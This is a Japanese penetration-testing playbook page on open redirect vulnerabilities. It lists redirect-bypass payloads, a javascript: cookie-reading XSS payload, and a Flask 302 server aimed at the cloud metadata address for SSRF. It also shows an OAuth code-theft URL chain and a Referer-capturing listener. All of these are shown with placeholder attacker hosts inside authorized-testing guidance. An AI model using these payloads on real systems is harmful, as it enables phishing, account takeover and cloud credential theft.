# Open Redirect（オープンリダイレクト / Unvalidated Redirects）

## 着火条件

Open Redirect が使われている / 存在する可能性を判定する。下表のシグナルを上から実施し、1 つでも該当すれば本ファイルを使う。**該当ゼロなら閉じてよい**（リダイレクト処理自体が無い or 静的サイト）。

| シグナル | 確認方法 | 該当の意味 |
|---|---|---|
| URLパラメータに `redirect=` `return=` `returnTo=` `next=` `url=` `dest=` `destination=` `continue=` `target=` `forward=` `rurl=` `image_url=` `back=` `r=` `u=` のいずれかが観測される | Burp HTTP history で `[?&](redirect\|return\|next\|url\|dest\|continue\|target\|forward\|rurl\|back\|r\|u)=` を正規表現検索 | リダイレクト先がパラメータ制御 → パターン 1 系の試行対象 |
| ログイン成功後・ログアウト後・パスワードリセット後の遷移先が URL パラメータで指定されている | ログイン UI を 1 回通して HTTP history を観察。`?next=` `?redirect_to=` が付いていれば該当 | 認証フロー絡みの redirect → パターン 5（token 漏洩）の前提 |
| エラーページ・404 ページに「戻る」リンクがあり、URL に元のページ情報が含まれる | 存在しないパスを叩いて 404 ページの HTML を確認 | エラーページ経由の redirect |
| HTML 内に `<meta http-equiv="refresh" content="0;url=...">` が動的生成されている | レスポンス HTML を grep | meta refresh 経路（パターン 2） |
| JS で `window.location.href = ...` / `location.replace(...)` / `location.assign(...)` にユーザー制御値が流れている | JS バンドルを `grep -E "location\.(href\|replace\|assign)\s*="` | DOM ベース Open Redirect（パターン 2） |
| 任意のパラメータに `https://[ATTACKER_DOMAIN]` を入れて 302 Location が返る | `curl -sI "https://[TARGET]/?next=https://[ATTACKER_DOMAIN]"` で `Location: https://[ATTACKER_DOMAIN]` を確認 | サーバー側 redirect（パターン 1） |

> いずれも該当しない場合：本ファイルは閉じてよい。OAuth の `redirect_uri` バイパスを探しているなら `OAuth_Attacks.md` パターン 1 へ（OAuth 専用の検証ロジックがあるため別立てで扱う）。SSRF の防御回避目的なら `SSRF.md` に進む。

---

## 環境前提

- 実行環境: テスター端末
- 必要なツール:
  - `curl`（ペネトレ用 Linux ディストリ標準）— `-sI` で Location ヘッダーだけ見るのに使う
  - Burp Suite Community Edition（別途インストール要 / Proxy & Repeater で挙動確認）
  - ブラウザ（最終的に「ブラウザがどう解釈するか」が重要 — Chrome / Firefox の差で挙動が変わるバイパスあり）
  - 攻撃者制御ドメイン（フィッシングランディングや SSRF 連鎖の中継として。テスト時は `[ATTACKER_DOMAIN]` プレースホルダ）
- オフライン代替: `curl` だけでも検証可能（ブラウザ依存バイパスは確認できないが、サーバー側 redirect の挙動は確認できる）

---

## 観点・着眼点

着火条件で Open Redirect の存在を確定したら、次は**どのバイパス手法が通るか・どのチェーンに繋げるか**を選ぶための深掘りを行う。

### 深掘り 1：リダイレクト発生箇所の種別を特定する

| 発生箇所 | 確認方法 | 攻撃面 |
|---|---|---|
| サーバー側（HTTP 302 `Location` ヘッダー） | `curl -sI` でレスポンスヘッダー確認 | パターン 1 系（バイパス全般） |
| meta refresh（HTML 内） | レスポンス本文の `<meta http-equiv="refresh">` 検索 | パターン 2（HTML 経由 → `javascript:` スキームも通りやすい） |
| JavaScript（DOM ベース） | DevTools → Sources で `location.href = ` / `location.replace(` をブレークポイント | パターン 2（クライアント側）/ `XSS.md` の DOM XSS と隣接 |
| HTML link（`a タグの href` だけ・自動遷移なし） | リンクのクリック挙動を観察 | リダイレクト単独では低影響だが phishing 経由で高影響 |

### 深掘り 2：検証ロジックのフィンガープリント

`redirect=` に色々な値を入れて返り方を観察し、サーバーの検証方式を特定する：

| 試行値 | 返り方 | 判定 |
|---|---|---|
| `redirect=https://[ATTACKER_DOMAIN]` | 200 / 302 Location: [ATTACKER_DOMAIN] | 検証なし（最弱） |
| 同上 | 400 `invalid url` / リダイレクトしない | 検証あり → 以下を試す |
| `redirect=https://[VICTIM_DOMAIN].evil.example` | 通る | サフィックス検証（`endswith` チェック）または substring |
| `redirect=https://[VICTIM_DOMAIN]@[ATTACKER_DOMAIN]` | 通る | URL parser がホスト部を誤判定 |
| `redirect=//[ATTACKER_DOMAIN]` | 通る | scheme チェックが弱い（プロトコル相対 URL を許容） |
| `redirect=/\/[ATTACKER_DOMAIN]` | 通る | バックスラッシュ → スラッシュ正規化バグ（Chrome / Firefox 差あり） |
| `redirect=https://[VICTIM_DOMAIN]/path` のみ通る | 200 | パスのみ許容（同一ドメイン限定）→ ドメイン外への redirect 不可。XSS 連鎖（パターン 2）に切り替え |

### 深掘り 3：チェーン先の判定（単独 Open Redirect は低スコアだが、チェーンで化ける）

| 連鎖先 | 連鎖が成立する条件 | 得られるもの |
|---|---|---|
| OAuth の `redirect_uri` バイパス構成要素 | OAuth サーバーが victim の特定パス（例: `/redirect?next=`）を redirect_uri として登録済み | 被害者 OAuth code → アカウント乗っ取り（`OAuth_Attacks.md` パターン 1b） |
| SSRF の防御回避（302 follow 悪用） | SSRF クライアントが redirect を follow し、最終 URL の再検証をしない | 内部ネットワーク到達・メタデータ API（`SSRF.md`） |
| Reflected XSS（`javascript:` スキーム経由） | サーバー / クライアントが scheme チェックを `http://` `https://` 限定にしていない | XSS 成立 → セッション窃取（`XSS.md`） |
| 認証 token の Referer 漏洩 | リダイレクト元 URL に token / code が含まれ、リダイレクト先がそれを Referer で受け取る | 認証バイパス・アカウント乗っ取り |
| フィッシング誘導 | 単独 Open Redirect | victim ドメインで始まる URL でメールフィルタ・URL レピュテーションをすり抜ける |

### シグナル → 試みる攻撃パターン

| 観測した状態 | 試みる攻撃パターン |
|---|---|
| `redirect=https://[ATTACKER_DOMAIN]` がそのまま通る | バイパス不要 → パターン 1（バイパス検証は飛ばして OK） |
| `https://[ATTACKER_DOMAIN]` で 400 が返るが `//[ATTACKER_DOMAIN]` で通る | パターン 1a（プロトコル相対 URL） |
| substring / suffix 検証あり | パターン 1b（userinfo trick / サブドメイン汚染） |
| `https://` のみ許容で scheme チェックが甘い | パターン 1c（バックスラッシュ・複数スラッシュ） |
| 同一ドメインのみ許容 | パターン 2（`javascript:` スキーム経由 XSS） |
| OAuth `redirect_uri` のサブパスにこの redirect が存在 | パターン 4（OAuth 連鎖） |
| SSRF が `https://` のみ許容している環境 | パターン 3（302 経由で内部到達） |

### 攻撃クラスとチェーンで得るもの（全体図）

| 攻撃クラス | 単発の症状 | チェーンで攻撃者が得るもの |
|---|---|---|
| バイパス系（パターン 1） | 任意ドメインへの 302 | フィッシング誘導 / 被害者ブラウザを攻撃者制御サイトへ |
| `javascript:` スキーム → XSS（パターン 2） | リダイレクト先で JS 実行 | **セッション窃取 → アカウント乗っ取り** |
| SSRF 防御回避（パターン 3） | SSRF クライアントが攻撃者ホストへ → 攻撃者が 302 で内部 IP を返す | **内部ネットワーク到達・クラウドメタデータ取得** |
| OAuth 連鎖（パターン 4） | OAuth `redirect_uri` は victim のままだが、即座に attacker へ転送 | **被害者 OAuth code 奪取 → アカウント乗っ取り** |
| Referer 経由 token 漏洩（パターン 5） | リダイレクト元 URL のクエリ（code / token）が Referer に乗る | 認証情報・session token・OAuth code 漏洩 |

---

## 手順

### パターン1: バイパス系（検証ロジックを破る）

**前提：** 着火条件で「`redirect=`」等のパラメータが存在し、検証がある（深掘り 2 で検証方式を特定済み）場合に適用する。

#### 1a. プロトコル相対 URL（scheme 省略）

```
# [Attacker] http:// / https:// を抜く
redirect=//[ATTACKER_DOMAIN]/
redirect=//[ATTACKER_DOMAIN]/path?query=1
# ブラウザは現在のページの scheme を引き継ぐ → //attacker.com → https://attacker.com に展開
# サーバー側の検証が「https:// で始まるか」だけを見ていると素通り
```

#### 1b. userinfo trick（`@` を使ったホスト部偽装）

```
# [Attacker] @ 以前が userinfo として解釈される URL の仕様を悪用
redirect=https://[VICTIM_DOMAIN]@[ATTACKER_DOMAIN]/
# ブラウザは [VICTIM_DOMAIN] を user 名として無視し、実際のホストは [ATTACKER_DOMAIN]
# サーバー側の検証が「ホスト部に VICTIM_DOMAIN が含まれているか」だけ見ていると素通り

# 末尾に偽装パスを付ける variant
redirect=https://[ATTACKER_DOMAIN]/[VICTIM_DOMAIN]
redirect=https://[ATTACKER_DOMAIN]/?[VICTIM_DOMAIN]
redirect=https://[ATTACKER_DOMAIN]/#[VICTIM_DOMAIN]
# 「[VICTIM_DOMAIN] が URL のどこかに出てくるか」検証だと素通り
```

#### 1c. スラッシュ・バックスラッシュの正規化バグ

```
# [Attacker] バックスラッシュ
redirect=/\[ATTACKER_DOMAIN]/                    # サーバーは相対パス扱い・ブラウザは絶対 URL 扱い
redirect=https:\\[ATTACKER_DOMAIN]/              # 同上
redirect=https:/\/\[ATTACKER_DOMAIN]/            # 混在

# [Attacker] 多重スラッシュ
redirect=///[ATTACKER_DOMAIN]/
redirect=////[ATTACKER_DOMAIN]/
# 「先頭が / なら同一ドメインの相対パス」と判断する実装で素通り → ブラウザは絶対 URL として解釈
```

ブラウザ間で挙動が異なる：Chrome / Firefox / Safari それぞれで実際に踏ませて確認する。

#### 1d. URL エンコード / ダブルエンコード

```
# [Attacker] @ や / をエンコード
redirect=https://[ATTACKER_DOMAIN]%23[VICTIM_DOMAIN]      # %23 = # → fragment として無視される
redirect=https://[ATTACKER_DOMAIN]%2f[VICTIM_DOMAIN]      # %2f = /
redirect=https://[ATTACKER_DOMAIN]%5c[VICTIM_DOMAIN]      # %5c = \

# [Attacker] ダブルエンコード（サーバー側で 1 回 decode する実装狙い）
redirect=https://[ATTACKER_DOMAIN]%252e%252e/             # %25 = % → デコード後 %2e%2e = ..
```

#### 1e. IDN / Unicode / Punycode

```
# [Attacker] 視覚的に似た Unicode 文字でドメインを偽装
redirect=https://[VICTIM_DOMAIN_WITH_UNICODE_LOOKALIKE]/
# 例: ascii の 'a' を キリル文字の 'а' (U+0430) に置換
# 検証が文字列一致なら素通り、実際の DNS resolve は攻撃者ドメインへ

# [Attacker] Punycode 表記
redirect=https://xn--[ATTACKER_PUNYCODE]/
```

---

### パターン2: `javascript:` スキーム → XSS 化

**前提：** リダイレクト先の scheme チェックが緩い（`http://` `https://` 以外を許容）、特に**クライアントサイド redirect**（`location.href = userInput`）で成立しやすい。

```
# [Attacker] javascript: スキームで JS 実行
redirect=javascript:alert(document.cookie)

# [Attacker] vbscript:（IE 互換が残っている古い環境向け）
redirect=vbscript:msgbox(1)
```

成立例：

```html
<!-- ページ内に以下のような JS がある -->
<script>
  const next = new URLSearchParams(location.search).get('next');
  location.href = next;   // ← フィルタなし
</script>
```

このコードに `?next=javascript:alert(1)` を渡すと、`location.href = "javascript:alert(1)"` で JS 実行成立。

**成功の確認：** リダイレクト後 alert が出る / Cookie が攻撃者ホストに飛ぶ → XSS 成立。以降は `XSS.md` の Cookie スティーリング / DOM 偽装と同じチェーン。

---

### パターン3: SSRF 防御回避（302 経由で内部到達）

**前提：** SSRF を試みているが、サーバー側が `http://127.0.0.1/` `http://169.254.169.254/` 等を**直接アクセスは拒否**している場合に成立。

```bash
# [Attacker] 攻撃者ホストで 302 を返す簡易サーバー
python3 -m http.server 8080
# index.html に Location ヘッダーを仕込む or 専用スクリプトを書く

# [Attacker] Flask で 302 サーバー
python3 -c "
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/')
def r(): return redirect('http://169.254.169.254/latest/meta-data/', code=302)
app.run(host='0.0.0.0', port=8080)
"
```

```bash
# [Target side（被害サーバー）に対して SSRF 経由でアクセスさせる]
curl "https://[TARGET]/fetch?url=http://[ATTACKER_HOST]:8080/"
# 被害サーバーが 302 を follow すれば 169.254.169.254 に到達 → メタデータ取得
```

**前提条件（攻撃者ホスト側で 302 を返すだけでは成立しないケース）：**

- SSRF クライアントが `follow_redirects=False` 設定なら不成立
- リダイレクト先 URL を**再検証する**実装なら不成立（多くの SSRF 対策ライブラリは検証する）

詳細は `SSRF.md`（フィルタバイパス手法）参照。

---

### パターン4: OAuth `redirect_uri` バイパスとの連鎖

**前提：** OAuth 認可サーバーが redirect_uri として `https://[VICTIM_DOMAIN]/oauth/callback` を登録している。被害サーバー（VICTIM）の別パス（例: `/redirect?next=`）に open redirect が存在する場合に成立。

```
# [Attacker] 被害者を踏ませる URL
https://[AUTH_SERVER]/oauth/authorize?
  response_type=code&
  client_id=[CLIENT_ID]&
  redirect_uri=https://[VICTIM_DOMAIN]/redirect?next=https://[ATTACKER_DOMAIN]&
  scope=openid+email&
  state=[RANDOM]

# 認可サーバーは redirect_uri を [VICTIM_DOMAIN] と判定（パスは見ない実装が多い）→ 通る
# 被害者ブラウザは [VICTIM_DOMAIN]/redirect?next=[ATTACKER_DOMAIN]?code=[CODE] に到達
# Open Redirect が code 込みで [ATTACKER_DOMAIN] に転送 → 攻撃者は code 取得
```

詳細は `OAuth_Attacks.md` パターン 1b 参照。**OAuth 単独では「redirect_uri は victim 限定」というルールがあっても、open redirect が組み合わさると破綻する**点が攻撃者視点の急所。

---

### パターン5: 認証 token / OAuth code の Referer 漏洩

**前提：** リダイレクト元 URL のクエリパラメータに認証情報（OAuth code / セッション token / password reset token 等）が含まれ、リダイレクト先が外部ドメインの場合に成立。

```
# 元 URL（被害者が見ているページ）
https://[VICTIM_DOMAIN]/auth/callback?code=[OAUTH_CODE]&state=[STATE]

# このページが Open Redirect で attacker に飛ばす
# → ブラウザは Referer: https://[VICTIM_DOMAIN]/auth/callback?code=[OAUTH_CODE]&state=[STATE]
#   を attacker への HTTP リクエストに含める（Referrer-Policy が strict-origin 未満の場合）
```

**確認手順：**

```bash
# [Attacker] Referer を取得する受信サーバー
python3 -m http.server 8080
# アクセスログに Referer が含まれていれば OAuth code / token が漏洩している
```

**防御側の対策（攻撃側として通らない条件）：**

- `Referrer-Policy: no-referrer` / `strict-origin` ヘッダーが設定されていると Referer 経由は通らない
- ただし JS で `window.location.search` を XHR で attacker に送信させれば回避可能 → パターン 2（XSS 化）に切り替える

---

## 刺さらなかったとき

- **`redirect=https://[ATTACKER_DOMAIN]` が 400** → 検証あり。深掘り 2 の表を順に試して検証方式を特定 → パターン 1a〜1e から該当を選ぶ
- **`javascript:` スキームが拒否される** → サーバー側 redirect ではほぼ通らない（Location ヘッダーで `javascript:` は HTTP 仕様外）。DOM ベース redirect を探す（JS バンドル grep）
- **同一ドメインのみ許容（バイパス全滅）** → サーバー側 redirect では Open Redirect 単独成立は不可。`javascript:` スキーム XSS（パターン 2）/ Reflected XSS の前段に切り替える
- **SSRF 連鎖（パターン 3）で 302 が follow されない** → SSRF クライアントの実装次第。DNS リバインディング・別プロトコル（gopher / file）に切り替える（`SSRF.md` 参照）
- **Open Redirect は確認できたが影響が「攻撃者ドメインへの 302」だけで終わる** → 単独では低スコアだが、報告書では「フィッシング誘導の信頼性向上」「OAuth / SSO 連鎖の構成要素」を必ず併記する。チェーンで化ける可能性を示す

---

## 注意点・落とし穴

- **ブラウザ間の URL parser 差異** → Chrome / Firefox / Safari / Edge で `//` `\\` `@` の解釈が異なる。サーバー側 grep だけで判定せず、実際に**主要ブラウザで踏ませて挙動確認**する
- **`location.href = userInput` の自動 sanitize** → モダンブラウザは `javascript:` スキームを `location.href` 経由でブロックする実装がある（Chrome 90+ 等）。リンクの `target="_blank"` + `noopener` がない場合は別経路（`window.open`）が通ることがある
- **`Referrer-Policy` ヘッダー** → デフォルト挙動はブラウザ・サイトで異なる。最近のブラウザは `strict-origin-when-cross-origin` がデフォルト → クロスオリジン時はパスとクエリが落ちる。Referer 漏洩攻撃（パターン 5）はヘッダー設定次第で不成立
- **CSRF token を含む URL** → token が URL クエリにあると Referer 漏洩経路で他サイトに漏れる。token は POST body / カスタムヘッダーに入れるのが本来。Open Redirect とは別の発見として報告する
- **メールフィルタ・URL レピュテーション回避** → Open Redirect は単独でもフィッシング配信の前段で価値がある。`https://[VICTIM_DOMAIN]/redirect?next=https://[PHISH_DOMAIN]` は victim ドメインで始まるため、SafeBrowsing / Defender などが信頼してしまうことがある
- **報告書での severity 判定** → 単独 Open Redirect は CVSS 3.1 で 4.3 程度（Low〜Medium）。OAuth / SSRF / XSS チェーンが成立すると 8.0+ に跳ね上がる。「単独で見た時のスコア」と「チェーン込みのスコア」を併記する

---

## 本番での前提

- **事前合意の要否**: ★★（口頭確認可）— 単独検証は低リスク。フィッシング誘導 PoC / 認証チェーンへの連鎖検証は事前確認推奨
- **想定される SIEM/EDR 検知**: WAF ルール（外部ドメインへの redirect ペイロード検知）/ 不審な Referer / 短時間に複数 redirect URL を試行
- **業務影響リスク**: 低（読み取り系・サーバーへの永続的変更なし）
- **原状回復必須項目**: なし（PoC で被害者役アカウントに踏ませたフィッシングセッションがあれば破棄）
- **取得情報の取扱**: Referer 経由で取得した token / code は認証情報扱い・暗号化保管・案件終了時破棄
- **演習環境での扱い**: 制約なし

---

## 関連技術

- 前：Web 列挙でリダイレクト系パラメータを発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：レスポンス一次トリアージで `Referrer-Policy` 欠落を確認 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：OAuth `redirect_uri` バイパス連鎖 → `./OAuth_Attacks.md`（パターン 1b）
- 後：SSRF 防御回避連鎖 → `./SSRF.md`
- 後：`javascript:` スキーム経由 XSS 化 → `./XSS.md`
- 関連：Cookie / Token を Referer で漏洩させる経路として → `./XSS.md`（Cookie スティーリング）
